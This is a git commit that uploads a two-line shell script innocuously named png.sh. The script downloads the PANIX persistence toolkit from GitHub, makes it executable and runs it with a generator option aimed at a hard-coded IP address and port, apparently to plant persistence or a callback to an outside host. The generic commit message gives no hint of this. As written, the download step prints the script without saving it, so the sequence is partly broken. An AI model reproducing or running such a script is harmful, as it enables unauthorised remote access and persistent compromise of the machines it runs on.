0b196992d0c69ffda1434626e689493f6a87be10
h-moody <73345535+h-moody@users.noreply.github.com>
2024-12-10 20:31:45 +0300

    Add files via upload

---
+++ png.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+/bin/bash -c 'curl -sL https://github.com/Aegrah/PANIX/releases/download/panix-v2.0.0/panix.sh' && /bin/chmod +x panix.sh && ./panix.sh --generator --ip 212.34.145.146 --port 8086
